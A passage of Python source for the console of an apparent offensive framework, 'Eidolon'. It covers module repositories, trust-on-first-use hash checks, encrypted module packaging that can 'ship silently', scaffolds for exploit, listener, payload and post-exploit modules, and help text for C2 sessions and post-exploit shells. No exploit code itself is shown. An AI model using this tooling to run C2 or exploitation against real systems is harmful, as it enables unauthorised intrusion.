                    if kw in f"{k} {v.get('description', '')} {v.get('tags', '')} {v.get('cve', '')} {v.get('protocol', '')} {v.get('payload_type', '')} {v.get('rank', '')} {v.get('targets', '')}".lower()
                }
            else:
                filtered = modules
            if not filtered:
                return warn("No matching modules.")
            rows = []
            for name, minfo in sorted(filtered.items()):
                tags = minfo.get("tags", [])
                meta = ", ".join(tags) if isinstance(tags, list) else str(tags or "")
                proto = minfo.get("protocol")
                if proto:
                    meta = f"{meta} | {C.CYAN}{proto}{C.RESET}" if meta else f"{C.CYAN}{proto}{C.RESET}"
                rank = str(minfo.get("rank", "") or "").strip()
                if rank:
                    meta = f"{_rank_str(rank)} | {meta}" if meta else _rank_str(rank)
                cve = minfo.get("cve")
                if cve:
                    meta = f"{meta} | {C.RED}{cve}{C.RESET}" if meta else f"{C.RED}{cve}{C.RESET}"
                rows.append([
                    f"{C.CYAN}{name}{C.RESET}",
                    minfo.get("version", "-"),
                    minfo.get("type", "tar"),
                    (meta or "-")[:35],
                ])
            print_table(["Module Name", "Version", "Type", "Tags / CVE"], rows,
                        title=f"AVAILABLE MODULES ({len(filtered)})")
            return

        if cmd == "info":
            if len(args) < 2:
                return err("usage: repo info <name>")
            modules = self.repo_mgr.get_all_modules()
            if args[1] not in modules:
                return err(f"Module '{args[1]}' not found in remotes.")
            m = modules[args[1]]
            tags = m.get("tags", [])
            tags_str = ", ".join(tags) if isinstance(tags, list) else str(tags or "")
            print(f"\n  {C.PURPLE}╭─ REMOTE MODULE INTEL ──────────────╮{C.RESET}")
            print(f"  {C.PURPLE}│{C.RESET} name : {C.CYAN}{args[1]}{C.RESET}")
            print(f"  {C.PURPLE}│{C.RESET} path : {m.get('path', args[1])}")
            print(f"  {C.PURPLE}│{C.RESET} type : {m.get('type', 'tar')} | ver: {m.get('version', '-')}")
            if m.get("payload_type"):
                print(f"  {C.PURPLE}│{C.RESET} payload type : {C.PINK}{m['payload_type']}{C.RESET}")
            if m.get("protocol"):
                print(f"  {C.PURPLE}│{C.RESET} protocol     : {C.CYAN}{m['protocol']}{C.RESET} {C.GRAY}(wire dialect pinned by the index){C.RESET}")
            if m.get("rank"):
                print(f"  {C.PURPLE}│{C.RESET} rank : {_rank_str(m['rank'])}")
            print(f"  {C.PURPLE}│{C.RESET} desc : {m.get('description', '-')}")
            if m.get("targets"):
                tg = m["targets"]
                tg_s = tg if isinstance(tg, str) else ", ".join(str(t) for t in tg)
                print(f"  {C.PURPLE}│{C.RESET} targets: {C.LIME}{tg_s}{C.RESET}")
            if m.get("references"):
                rf = m["references"]
                rf_s = rf if isinstance(rf, str) else "; ".join(str(r) for r in rf[:3]) + (" …" if len(rf) > 3 else "")
                print(f"  {C.PURPLE}│{C.RESET} refs : {C.GRAY}{rf_s}{C.RESET}")
            if tags_str:
                print(f"  {C.PURPLE}│{C.RESET} tags : {C.LIME}{tags_str}{C.RESET}")
            if m.get("cve"):
                cvss = m.get("cvss")
                cvss_str = f" (CVSS: {cvss})" if cvss is not None else ""
                print(f"  {C.PURPLE}│{C.RESET} vuln : {C.RED}{m['cve']}{cvss_str}{C.RESET}")
            if m.get("sha256"):
                print(f"  {C.PURPLE}│{C.RESET} sha  : {C.GRAY}{m['sha256'][:24]}…{C.RESET}")
            if m.get("enc") or m.get("encrypted"):
                enc_note = "password in index" if (m.get("password") or m.get("key")) else "password prompted at install"
                print(f"  {C.PURPLE}│{C.RESET} enc  : {C.YELLOW}encrypted package{C.RESET} ({enc_note})")
            print(f"  {C.PURPLE}│{C.RESET} url  : {m.get('url', '-')}")
            print(f"  {C.PURPLE}╰────────────────────────────────────╯\n")
            return

        if cmd == "stats":
            s = self.repo_mgr.stats()
            trust_entries = self.trust_mgr.list_all()
            trusted_ct = sum(1 for e in trust_entries.values() if e.get("trusted"))
            print(f"\n  {C.PURPLE}╭─ REPOSITORY STATISTICS ────────────╮{C.RESET}")
            print(f"  {C.PURPLE}│{C.RESET}  Remotes     : {s['remotes']} ({s['enabled']} enabled)")
            print(f"  {C.PURPLE}│{C.RESET}  Modules     : {s['modules']} available")
            print(f"  {C.PURPLE}│{C.RESET}  Cache Size  : {s['cache_bytes'] / 1024:.2f} KB")
            print(f"  {C.PURPLE}│{C.RESET}  Trust       : {C.GREEN}{trusted_ct}{C.RESET} trusted / {len(trust_entries)} registered")
            print(f"  {C.PURPLE}╰────────────────────────────────────╯\n")
            return

        if cmd == "check":
            all_remote = self.repo_mgr.get_all_modules()
            rows = []
            for local_name in self.modules:
                remote_key, remote_info = self.repo_mgr.find_by_local_name(local_name, all_remote)
                if not remote_key:
                    continue
                rows.append([
                    remote_key,
                    getattr(self.modules[local_name], "VERSION", "-"),
                    remote_info.get("version", "-"),
                ])
            if not rows:
                return info("no installed modules have a remote source")
            print_table(["Module", "Local VERSION", "Index version"], rows,
                        title="REMOTE-SOURCED MODULES (index version is informational — updates are manual)")
            return

        if cmd == "install":
            force = any(a in ("--force", "-f") for a in args)
            names = [a for a in args[1:] if not a.startswith("-")]
            if not names:
                return err("usage: repo install <name> [--force]")
            mod_name = names[0]

            if not force:
                existing = self._is_module_installed(mod_name)
                if existing:
                    return warn(
                        f"Module '{mod_name}' already installed at '{existing}'. "
                        f"Use 'repo install {mod_name} --force' or 'remove {existing}' first."
                    )

            modules = self.repo_mgr.get_all_modules()
            if mod_name not in modules:
                return err(f"Module '{mod_name}' not found in any remote.")

            success, reason = self.repo_mgr.install_module(
                modules[mod_name], force=force, trust_mgr=self.trust_mgr
            )
            if success:
                ok(f"Module '{mod_name}' installed.")
                warn(f"UNTRUSTED — run {C.PINK}trusted{C.RESET} to inspect, then {C.PINK}trust <path>{C.RESET} to enable.")
                self.load_modules()
            else:
                err(f"Installation failed: {reason}")
            return

        if cmd in ("upgrade", "update-all"):
            all_remote = self.repo_mgr.get_all_modules()
            to_update = []

            if cmd == "upgrade" and len(args) > 1:
                local_name = self._resolve(args[1])
                if not local_name:
                    return err(f"Module '{args[1]}' not installed.")
                remote_key, remote_info = self.repo_mgr.find_by_local_name(local_name, all_remote)
                if not remote_key:
                    return err(f"Module '{args[1]}' has no remote source.")
                to_update.append((local_name, remote_key, remote_info))
            else:
                for local_name in self.modules:
                    remote_key, remote_info = self.repo_mgr.find_by_local_name(local_name, all_remote)
                    if remote_key:
                        to_update.append((local_name, remote_key, remote_info))
                if not to_update:
                    return ok("nothing to update — no installed module has a remote source")
                warn(f"reinstalling {len(to_update)} module(s) from remotes (index 'version' is ignored)")

            for local_name, remote_key, remote_info in to_update:
                spectral(f"Upgrading {C.CYAN}{remote_key}{C.RESET}…")
                self.do_remove(local_name)
                success, reason = self.repo_mgr.install_module(
                    remote_info, force=True, trust_mgr=self.trust_mgr
                )
                if success:
                    ok(f"Upgraded {remote_key}.")
                    warn(f"UNTRUSTED — run {C.PINK}trust {local_name}{C.RESET} to re-enable.")
                else:
                    err(f"Failed to upgrade {remote_key}: {reason}")
            self.load_modules()
            return

        if cmd == "pack":
            pw = None
            if "--password" in args:
                i = args.index("--password")
                if i + 1 < len(args):
                    pw = args[i + 1]
            positional = [a for a in args[1:] if not a.startswith("--") and a != pw]
            if len(positional) < 2:
                return err("usage: repo pack <src> <output.tar.zst.enc> [--password <pw>]")
            src, outp = positional[0], positional[1]
            if not pw:
                pw = getpass.getpass("  package password: ")
            if not encrypt_package(src, outp, pw):
                return err(f"packing failed: {src}")
            digest = sha256_of_path(outp)
            ok(f"packed {C.CYAN}{src}{C.RESET} → {C.PINK}{outp}{C.RESET}")
            info(f"sha256 : {C.BOLD}{digest}{C.RESET}")
            info("index entry fields:")
            print(f"      {C.GRAY}\"url\"      : \"<host this file>\"{C.RESET}")
            print(f"      {C.GRAY}\"sha256\"  : \"{digest}\"{C.RESET}")
            print(f"      {C.GRAY}\"enc\"     : true{C.RESET}")
            warn("no password in index → install prompts for it (private module)")
            info("add \"password\": \"…\" to the entry to ship it silently (host-obfuscation only)")
            return

        if cmd == "source":
            if len(args) < 2:
                return err("usage: repo source <name>")
            name = self._resolve(args[1])
            if not name:
                return err("Module not installed.")
            mod = self.modules.get(name)
            if mod:
                print(f"\n  {C.PURPLE}╭─ MODULE SOURCE ────────────────────╮{C.RESET}")
                print(f"  {C.PURPLE}│{C.RESET} Module : {name}")
                print(f"  {C.PURPLE}│{C.RESET} Path   : {getattr(mod, '__eidolon_path__', 'Unknown')}")
                print(f"  {C.PURPLE}╰────────────────────────────────────╯\n")
            else:
                print(f"\n  {C.PURPLE}╭─ MODULE SOURCE (UNTRUSTED) ────────╮{C.RESET}")
                print(f"  {C.PURPLE}│{C.RESET} Module : {name}")
                print(f"  {C.PURPLE}│{C.RESET} Path   : {os.path.join(MODULES_DIR, name + '.py')}")
                print(f"  {C.PURPLE}│{C.RESET} Status : {C.YELLOW}{self._untrusted.get(name, 'untrusted')}{C.RESET}")
                print(f"  {C.PURPLE}╰────────────────────────────────────╯\n")
            return

        err("usage: repo [list|add|remove|enable|disable|priority|sync|search|list-modules|stats|check|install|upgrade|update-all|pack|source|info]")

    # ═════════════════════════════════════════════════════════
    # TOFU TRUST COMMANDS (NEW)
    # ═════════════════════════════════════════════════════════
    def do_trust(self, arg):
        """trust <module>|--all — Record hash and enable loading (TOFU)"""
        arg = arg.strip()
        if not arg:
            return err("usage: trust <module> | trust --all")

        if arg == "--all":
            to_trust = []
            for name, status in list(self._untrusted.items()):
                fp = os.path.join(MODULES_DIR, name + ".py")
                if os.path.exists(fp):
                    to_trust.append((name, fp, status))
            if not to_trust:
                return info("nothing to trust")
            warn(f"about to trust {len(to_trust)} module(s):")
            for name, _, status in to_trust:
                warn(f"  · {name} ({status})")
            for name, fp, _ in to_trust:
                h = self.trust_mgr.trust(name, fp)
                ok(f"trusted {C.PINK}{name}{C.RESET} sha256:{h[:16]}…")
            self.load_modules()
            return

        # resolve module key (accepts display name or path)
        name = arg
        if name not in self._untrusted and name not in self.modules:
            resolved = self._resolve(name)
            if resolved:
                name = resolved
            else:
                return err(f"module '{arg}' not found")

        fp = os.path.join(MODULES_DIR, name + ".py")
        if not os.path.exists(fp):
            return err(f"file not found: {fp}")

        prev = self.trust_mgr.get_entry(name) or {}
        prev_status = self._untrusted.get(name, "new")

        h = self.trust_mgr.trust(name, fp)
        ok(f"trusted {C.PINK}{name}{C.RESET}  sha256:{h[:16]}…  (was: {prev_status})")
        if prev_status == "modified" and prev.get("sha256"):
            warn(f"previous hash: {prev['sha256'][:16]}…  — file had been modified")
        self.load_modules()

    def do_untrust(self, arg):
        """untrust <module> — Remove trust entry (module won't load)"""
        name = arg.strip()
        if not name:
            return err("usage: untrust <module>")
        if self.trust_mgr.untrust(name):
            ok(f"untrusted {C.PINK}{name}{C.RESET}")
            self.load_modules()
            return
        resolved = self._resolve(name)
        if resolved and self.trust_mgr.untrust(resolved):
            ok(f"untrusted {C.PINK}{resolved}{C.RESET}")
            self.load_modules()
            return
        warn(f"'{name}' not in trust registry")

    def do_trusted(self, arg):
        """trusted [--all] — List trust registry (default: untrusted only)"""
        show_all = "--all" in arg or "-a" in arg
        entries = self.trust_mgr.list_all()
        if not entries:
            return info("no modules registered — install one first")

        rows = []
        for key, entry in sorted(entries.items()):
            trusted = entry.get("trusted", False)
            if not trusted and not show_all:
                continue
            # live status
            fp = os.path.join(MODULES_DIR, key + ".py")
            live_status = "missing"
            if os.path.exists(fp):
                if trusted:
                    try:
                        live_status = "ok" if sha256_of_path(fp) == entry.get("sha256") else "modified"
                    except OSError:
                        live_status = "unreadable"
                else:
                    live_status = "untrusted"

            color = _TRUST_COLOR.get(live_status, C.WHITE)
            sha = (entry.get("sha256") or "")[:16]
            source = entry.get("source", "?")
            rows.append([
                f"{C.CYAN}{key}{C.RESET}",
                f"{color}{live_status}{C.RESET}",
                f"{sha}…" if sha else "-",
                source,
            ])

        if not rows:
            return info("no trusted modules — use 'trusted --all' to see all registered")

        title = "TRUST REGISTRY (all)" if show_all else "TRUST REGISTRY (untrusted/modified)"
        print_table(["Module", "Status", "SHA256", "Source"], rows, title=title)

    def do_verify(self, arg):
        """verify — Re-check all module hashes against trust registry"""
        results = self.trust_mgr.verify_all()
        if not results:
            return info("no modules registered — nothing to verify")

        problems = {k: v for k, v in results.items() if v != "ok"}
        if not problems:
            return ok(f"all {len(results)} registered module(s) verified (hashes match)")

        rows = []
        for k, status in sorted(problems.items()):
            color = _TRUST_COLOR.get(status, C.WHITE)
            rows.append([f"{C.CYAN}{k}{C.RESET}", f"{color}{status}{C.RESET}"])
        print_table(["Module", "Issue"], rows, title="TRUST VIOLATIONS")
        warn(f"{len(problems)}/{len(results)} module(s) failed — inspect with 'trusted --all'")
        for k, s in problems.items():
            if s == "modified":
                warn(f"{C.PINK}{k}{C.RESET} was modified after trust — run 'trust {k}' to accept or 'remove {k}' to purge")

    # ═════════════════════════════════════════════════════════
    # LOCAL MODULE INSTALL (with destination path)
    # ═════════════════════════════════════════════════════════
    def _do_install_local(self, arg):
        try:
            parts = shlex.split(arg)
        except ValueError as e:
            return err(f"parse error: {e}")

        force = any(p in ("--force", "-f") for p in parts)
        parts = [p for p in parts if p not in ("--force", "-f")]

        if not parts:
            return err("usage: add_module <src> [dest] [--force]")

        src = parts[0]
        dest = parts[1] if len(parts) > 1 else None

        # Resolve source
        src_path = Path(os.path.expanduser(src))
        if not src_path.is_absolute():
            src_path = Path.cwd() / src_path
        if not src_path.exists():
            return err(f"source not found: {src_path}")

        is_dir = src_path.is_dir()
        if not is_dir and not str(src_path).endswith(".py"):
            return err("only .py files or directories allowed")

        if is_dir:
            py_files = [f for f in src_path.rglob("*.py")
                        if not f.name.startswith(("_", "@")) and "__pycache__" not in str(f)]
            if not py_files:
                return err(f"no .py files found in {src_path}")

        # Resolve destination
        if dest:
            dest = dest.replace("\\", "/").strip("/")
            if not dest:
                return err("dest cannot be empty")
            if dest.startswith("/") or ":" in dest.split("/")[0]:
                return err("dest must be a relative path")
            parts_check = dest.split("/")
            if any(p == ".." for p in parts_check):
                return err("dest cannot contain '..'")
            if not is_dir and dest.endswith(".py"):
                dest_rel = dest
            else:
                dest_rel = f"{dest}/{src_path.name}" if is_dir else f"{dest}/{src_path.name}"
        else:
            dest_rel = src_path.name

        installed = []  # (module_key, abs_path, orig_path)

        try:
            asset_dests = []

            if is_dir:
                base_dest = dest_rel.rstrip("/")
                for fsrc in py_files:
                    rel_in_src = fsrc.relative_to(src_path).as_posix()
                    fdest_rel = f"{base_dest}/{rel_in_src}"
                    fdest = Path(MODULES_DIR) / fdest_rel
                    fdest.parent.mkdir(parents=True, exist_ok=True)
                    key = fdest_rel[:-3]
                    if self.trust_mgr.get_entry(key) and not force:
                        warn(f"'{key}' already registered — skipping (use --force)")
                    else:
                        shutil.copy2(fsrc, fdest)
                        installed.append((key, str(fdest), str(fsrc)))
                    asset_dests.extend(_ship_declared_assets(fsrc, fdest.parent, key))
            else:
                dest_path = Path(MODULES_DIR) / dest_rel
                dest_path.parent.mkdir(parents=True, exist_ok=True)
                key = dest_rel[:-3]
                if self.trust_mgr.get_entry(key) and not force:
                    asset_dests.extend(_ship_declared_assets(src_path, dest_path.parent, key))
                    return warn(f"'{key}' already registered — use --force to overwrite")
                shutil.copy2(src_path, dest_path)
                installed.append((key, str(dest_path), str(src_path)))
                asset_dests.extend(_ship_declared_assets(src_path, dest_path.parent, key))

        except Exception as e:
            return err(f"copy failed: {e}")

        if not installed and not asset_dests:
            return warn("nothing installed")

        for key, fp, orig in installed:
            self.trust_mgr.register_untrusted(key, fp, source="local", original=orig)
            ok(f"installed {C.CYAN}{key}{C.RESET} → {os.path.relpath(fp, MODULES_DIR)}")

        if asset_dests:
            samples = sorted(os.path.relpath(str(f), MODULES_DIR) for f in asset_dests)
            head = ", ".join(samples[:3]) + (" …" if len(samples) > 3 else "")
            ok(f"shipped {len(asset_dests)} ASSETS file(s) alongside ({head})")

        if not installed:
            return info("no module(s) installed — declared ASSETS only")

        warn(f"{len(installed)} module(s) installed but UNTRUSTED")
        warn(f"inspect: {C.PINK}trusted --all{C.RESET}   trust: {C.PINK}trust <path>{C.RESET}")
        self.load_modules()

    # ═══════════════════════════════════════════════════════════════════
    # MODULE SCAFFOLDING (new_module)
    # ═══════════════════════════════════════════════════════════════════
    def do_new_module(self, arg):
        """new_module <name> [dir] [--fa] [type] — scaffold a fully documented
        module skeleton with a zero-to-100 developer guide embedded in the
        docstring; type: exploit|listener|payload|post-exploit|auxiliary|generic
        (--fa = complete Persian field documentation; default English)"""
        types_map = {
            "exploit": "exploit", "listener": "listener", "server": "listener",
            "payload": "payload", "c2": "payload", "post-exploit": "post-exploit",
            "postexploit": "post-exploit", "post-ex": "post-exploit", "post": "post-exploit",
            "auxiliary": "auxiliary", "aux": "auxiliary", "generic": "generic",
        }
        toks = arg.split()
        persian = "--fa" in toks
        toks = [t for t in toks if t != "--fa"]
        if not toks:
            return err("usage: new_module <name> [dir] [--fa] "
                       "[exploit|listener|payload|post-exploit|auxiliary|generic]")

        raw_name = toks[0].strip("/")
        if not raw_name:
            return err("module name cannot be empty")
        parts = [p for p in raw_name.split("/") if p and p != "."]
        if not parts or any(p == ".." for p in parts):
            return err(f"invalid module name: {raw_name!r}")
        for p in parts:
            if not all(ch.isalnum() or ch in "_-" for ch in p):
                return err(f"invalid characters in name (letters, digits, _ or - only): {raw_name!r}")

        mtype = None
        target_dir = None
        for tok in toks[1:]:
            low = tok.lower().lstrip("-")
            if low in types_map and mtype is None:
                mtype = types_map[low]
            elif target_dir is None:
                target_dir = tok
        if mtype is None:
            info("module types: 1=exploit (delivery) · 2=listener (C2 server) · "
                 "3=payload (builder) · 4=post-exploit (recon/escalation) · "
                 "5=auxiliary (recon/support) · 6=generic (tools)")
            try:
                reply = input("  ? module type [1-6 or name]: ").strip()
            except (EOFError, KeyboardInterrupt):
                return err("aborted — module type required")
            mtype = {"1": "exploit", "2": "listener", "3": "payload",
                     "4": "post-exploit", "5": "auxiliary",
                     "6": "generic"}.get(reply) or types_map.get(reply.lower())
            if not mtype:
                return err(f"unknown module type: {reply!r}")

        base    = parts[-1]
        rel_key = "/".join(parts)
        if target_dir:
            target_dir  = os.path.expanduser(target_dir) if target_dir.startswith("~") else target_dir
            target_file = os.path.join(target_dir, base + ".py")
            external    = True
        else:
            target_file = os.path.join(MODULES_DIR, rel_key + ".py")
            external    = False

        if os.path.exists(target_file):
            return err(f"already exists: {target_file}")

        category = parts[0] if len(parts) > 1 else "custom"
        lang = "fa" if persian else "en"
        try:
            template = _MODULE_SCAFFOLDS[mtype][lang]
        except KeyError:
            return err(f"no {lang} scaffold for type {mtype!r}")
        content = (template
                   .replace("__NAME__", base)
                   .replace("__CATEGORY__", category)
                   .replace("__AUTHOR__", self.operator_name))

        try:
            os.makedirs(os.path.dirname(target_file) or ".", exist_ok=True)
            with open(target_file, "w", encoding="utf-8") as f:
                f.write(content)
        except OSError as e:
            return err(f"cannot write module: {e}")

        kind = "fa (Persian docs)" if persian else "en (English docs)"
        if not external:
            self.trust_mgr.register_untrusted(rel_key, target_file, source="local")
            ok(f"scaffolded {C.CYAN}{rel_key}{C.RESET} → {target_file} [{mtype} · {kind}]")
            warn("module is UNTRUSTED (TOFU)")
            info(f"read the doc inside, then: {C.PINK}trust {rel_key}{C.RESET}  →  "
                 f"{C.PINK}use {rel_key}{C.RESET}  →  {C.PINK}set …{C.RESET}  →  {C.PINK}run{C.RESET}")
        else:
            ok(f"scaffolded {C.CYAN}{base}{C.RESET} → {target_file} [{mtype} · {kind}]")
            warn(f"outside the modules dir — it will NOT be auto-loaded; move it under {MODULES_DIR}")
        self.load_modules()

    def do_add_module(self, arg):
        """add_module <src> [dest] [--force] — Install local module (TOFU: untrusted until trusted); ships the module's declared ASSETS with it"""
        return self._do_install_local(arg)

    def do_install_local(self, arg):
        """install_local <src> [dest] [--force] — Same as add_module"""
        return self._do_install_local(arg)

    # ═════════════════════════════════════════════════════════
    # MODULE MANAGEMENT
    # ═════════════════════════════════════════════════════════
    def do_remove(self, arg):
        """remove <module_name> — Physically delete a module (also untrusts)"""
        name = self._resolve(arg.strip())
        if not name:
            return err(f"module '{arg.strip()}' not found.")

        # Physically delete
        mod_path = getattr(self.modules.get(name), "__eidolon_path__", None) if name in self.modules else None
        if not mod_path:
            mod_path = os.path.join(MODULES_DIR, name + ".py")

        if not os.path.exists(mod_path):
            return err(f"file not found: {mod_path}")

        abs_mod_path = os.path.abspath(mod_path)
        abs_modules_dir = os.path.abspath(MODULES_DIR)
        if not abs_mod_path.startswith(abs_modules_dir):
            return err("Security violation: attempted to delete outside modules dir")

        try:
            os.remove(abs_mod_path)
            self.trust_mgr.untrust(name)
            ok(f"Removed module: {C.PINK}{name}{C.RESET}")
            parent_dir = os.path.dirname(abs_mod_path)
            while parent_dir != abs_modules_dir and os.path.exists(parent_dir) and not os.listdir(parent_dir):
                os.rmdir(parent_dir)
                parent_dir = os.path.dirname(parent_dir)
            if self.current_name == name: self.do_back("")
            self.load_modules()
        except Exception as e:
            err(f"failed to remove module: {e}")

    def do_help(self, arg):
        """help [cmd] — show help"""
        arg = arg.strip()
        if arg:
            meth = getattr(self, f"do_{arg}", None)
            if not meth: return err(f"no such command: {arg}")
            print(f"\n  {C.PINK}{arg}{C.RESET}  —  {(meth.__doc__ or '').strip().splitlines()[0]}\n")
            return

        print(f"\n{C.PURPLE}╭─────────────────────────────────────────╮{C.RESET}")
        print(f"{C.PURPLE}│{C.RESET}  {C.PINK}EIDOLON{C.RESET} {C.GRAY}·{C.RESET} {C.CYAN}{CODENAME}{C.RESET} {C.GRAY}·{C.RESET} reference")
        print(f"{C.PURPLE}╰─────────────────────────────────────────╯{C.RESET}")
        print(f"  {C.CYAN}help{C.RESET} / {C.CYAN}clear{C.RESET} / {C.CYAN}banner{C.RESET} / {C.CYAN}reload{C.RESET} / {C.CYAN}exit{C.RESET}")
        print(f"  {C.CYAN}modules{C.RESET} / {C.CYAN}ls{C.RESET} [--all] / {C.CYAN}search{C.RESET} <kw> / {C.CYAN}info{C.RESET} <name>")
        print(f"  {C.CYAN}use{C.RESET} <name> / {C.CYAN}back{C.RESET} / {C.CYAN}options{C.RESET} / {C.CYAN}set{C.RESET} <k> <v> / {C.CYAN}run{C.RESET}")
        print(f"  {C.PINK}── TOFU ──{C.RESET}")
        print(f"  {C.CYAN}trust{C.RESET} <module>|--all    · {C.CYAN}untrust{C.RESET} <module>")
        print(f"  {C.CYAN}trusted{C.RESET} [--all]          · {C.CYAN}verify{C.RESET}")
        print(f"  {C.PINK}── REPO ──{C.RESET}")
        print(f"  {C.CYAN}repo{C.RESET} <list|add|remove|enable|disable|priority|sync|search|list-modules|stats|check|install|upgrade|update-all|pack|source|info>")
        print(f"  {C.PINK}── LOCAL ──{C.RESET}")
        print(f"  {C.CYAN}new_module{C.RESET} <name> [dir] [--fa] [type] — fully documented scaffold (exploit/listener/payload/post-exploit/auxiliary/generic)")
        print(f"  {C.CYAN}add_module{C.RESET} <src> [dest] [--force]")
        print(f"  {C.CYAN}install_local{C.RESET} <src> [dest] [--force]")
        print(f"  {C.CYAN}remove{C.RESET} <name> / {C.CYAN}setg{C.RESET} <k> <v> / {C.CYAN}globals{C.RESET}")
        print(f"  {C.PINK}── C2 (WRAITH KERNEL) ──{C.RESET}")
        print(f"  {C.CYAN}gen{C.RESET} <payload module>     — select a builder (params via set, build via run)")
        print(f"  {C.CYAN}jobs{C.RESET} / {C.CYAN}kill <id>{C.RESET}          — background jobs · {C.CYAN}c2{C.RESET} <status|sessions|payloads>")
        print(f"  {C.CYAN}use{C.RESET} <sid>              — enter a live C2 session (module-owned shell)")
        print(f"  {C.CYAN}shell{C.RESET}                 — post-exploit takeover: selected module's shell() channel\n")

    def do_banner(self, arg): print_banner(animate=True)
    def do_clear(self, arg): os.system("cls" if os.name == "nt" else "clear")

    def do_reload(self, arg):
        """reload — rescan workspace modules (TOFU re-check)"""
        if self._subshell_active: self.exit_subshell()
        spectral("reloading module arsenal (TOFU verification)…")
        self.current = self.current_name = self.current_options = None
        self.load_modules()
        ok("arsenal reloaded")

    def do_status(self, arg):
        """status — show operator status"""
        sessions = self.db.get_sessions()
        active = sum(1 for s in sessions if s["status"] == "active")
        trust_entries = self.trust_mgr.list_all()
        trusted_ct = sum(1 for e in trust_entries.values() if e.get("trusted"))
        print(f"\n  {C.PURPLE}╭─ OPERATOR STATUS ──────────────────╮{C.RESET}")
        print(f"  {C.PURPLE}│{C.RESET}  name      : {C.BOLD}{self.operator_name}{C.RESET}")
        print(f"  {C.PURPLE}│{C.RESET}  team      : {C.CYAN}{self.operator_team}{C.RESET}")
        print(f"  {C.PURPLE}│{C.RESET}  uptime    : {_uptime_str(self.session_t0)}")
        print(f"  {C.PURPLE}│{C.RESET}  workspace : {C.GREEN}{WORKSPACE_DIR}{C.RESET}")
        print(f"  {C.PURPLE}│{C.RESET}  modules   : {C.GREEN}{len(self.modules)}{C.RESET} loaded / {C.YELLOW}{len(self._untrusted)}{C.RESET} untrusted")
        print(f"  {C.PURPLE}│{C.RESET}  trust     : {C.GREEN}{trusted_ct}{C.RESET} trusted / {len(trust_entries)} registered")
        print(f"  {C.PURPLE}│{C.RESET}  sessions  : {C.GREEN}{active}{C.RESET} active")
        print(f"  {C.PURPLE}╰────────────────────────────────────╯\n")

    def do_exit(self, arg):
        """exit / quit — leave tool"""
        try:
            stopped = self.jobs.shutdown_all()
        except Exception:
            stopped = 0
        if stopped:
            spectral(f"{stopped} background job(s) shut down")
        if self._subshell_active:
            self.exit_subshell(); ok("returned to Eidolon"); return False
        print(f"\n  {C.PURPLE}╰─{C.RESET} {C.CYAN}eidolon out.{C.RESET}  {C.GRAY}uptime: {_uptime_str(self.session_t0)}{C.RESET}\n")
        return True

    do_quit = do_exit

    def do_modules(self, arg):
        """modules [--all] — List arsenal (default: trusted only)"""
        show_all = "--all" in arg or "-a" in arg

        if not self.modules and not (show_all and self._untrusted):
            return warn("no modules loaded.")

        rows = []
        # Trusted (loaded) modules
        for i, (name, m) in enumerate(sorted(self.modules.items()), 1):
            ver = getattr(m, "VERSION", "0.0.0")
            rows.append([
                f"{C.PURPLE}{i:02d}{C.RESET}",
                f"{C.CYAN}{name}{C.RESET}",
                ver,
                _type_label(m),
                getattr(m, "CATEGORY", "-"),
                f"{C.GREEN}trusted{C.RESET}",
                str(getattr(m, "DESCRIPTION", "-"))[:24],
            ])

        # Untrusted modules (blocked)
        if show_all and self._untrusted:
            for name, status in sorted(self._untrusted.items()):
                color = _TRUST_COLOR.get(status, C.YELLOW)
                rows.append([
                    f"{C.GRAY}--{C.RESET}",
                    f"{C.GRAY}{name}{C.RESET}",
                    "-", "-", "-",
                    f"{color}{status}{C.RESET}",
                    f"{C.GRAY}blocked by TOFU{C.RESET}",
                ])

        title = f"EIDOLON ARSENAL ({len(self.modules)} loaded"
        if show_all and self._untrusted:
            title += f" · {len(self._untrusted)} untrusted"
        title += ")"
        print_table(["#", "Arsenal", "Ver", "Type", "Category", "Trust", "Description"], rows, title=title)
    do_ls = do_modules

    def do_search(self, arg):
        kw = arg.strip().lower()
        if not kw: return err("usage: search <keyword>")
        hits = []
        for name, m in self.modules.items():
            if kw in (name + str(getattr(m, "DESCRIPTION", ""))).lower():
                hits.append((name, "trusted"))
        for name in self._untrusted:
            if kw in name.lower():
                hits.append((name, "untrusted"))
        if not hits: return warn("no matches.")
        for h, status in sorted(hits):
            marker = f"{C.GREEN}●{C.RESET}" if status == "trusted" else f"{C.YELLOW}○{C.RESET}"
            print(f"     {marker} {h}  {C.GRAY}[{status}]{C.RESET}")

    def do_info(self, arg):
        name = self._resolve(arg)
        if not name:
            return err(f"not found: '{arg.strip()}'")

        # Untrusted path
        if name in self._untrusted and name not in self.modules:
            status = self._untrusted[name]
            entry = self.trust_mgr.get_entry(name) or {}
            fp = os.path.join(MODULES_DIR, name + ".py")
            print(f"\n  {C.PURPLE}╭─ MODULE INTEL (UNTRUSTED) ─────────╮{C.RESET}")
            print(f"  {C.PURPLE}│{C.RESET} name  : {C.CYAN}{name}{C.RESET}")
            print(f"  {C.PURPLE}│{C.RESET} status: {_TRUST_COLOR.get(status, C.YELLOW)}{status}{C.RESET}")
            print(f"  {C.PURPLE}│{C.RESET} file  : {fp}")
            if entry.get("sha256"):
                print(f"  {C.PURPLE}│{C.RESET} sha256: {entry['sha256'][:24]}…")
            if entry.get("source"):
                print(f"  {C.PURPLE}│{C.RESET} source: {entry['source']}")
            if entry.get("original"):
                print(f"  {C.PURPLE}│{C.RESET} orig  : {entry['original']}")
            print(f"  {C.PURPLE}╰────────────────────────────────────╯")
            info(f"run {C.PINK}trust {name}{C.RESET} to inspect or use")
            return

        # Trusted path
        m = self.modules[name]
        entry = self.trust_mgr.get_entry(name) or {}
        print(f"\n  {C.PURPLE}╭─ MODULE INTEL ─────────────────────╮{C.RESET}")
        print(f"  {C.PURPLE}│{C.RESET} name: {c(name, C.WHITE)}")
        print(f"  {C.PURPLE}│{C.RESET} ver : {getattr(m, 'VERSION', '0.0.0')} | type: {_type_label(m)} | cat: {getattr(m,'CATEGORY','-')}")
        print(f"  {C.PURPLE}│{C.RESET} desc: {getattr(m,'DESCRIPTION','-')}")
        rank = _rank_str(getattr(m, "RANK", ""))
        if rank:
            print(f"  {C.PURPLE}│{C.RESET} rank: {rank}")
        targets = _targets_str(getattr(m, "TARGETS", None))
        if targets:
            print(f"  {C.PURPLE}│{C.RESET} targets: {C.LIME}{targets}{C.RESET}")
        refs = getattr(m, "REFERENCES", None) or []
        if refs:
            ref_str = "; ".join(str(ref) for ref in refs[:3])
            if len(refs) > 3:
                ref_str += " …"
            print(f"  {C.PURPLE}│{C.RESET} refs : {C.GRAY}{ref_str}{C.RESET}")
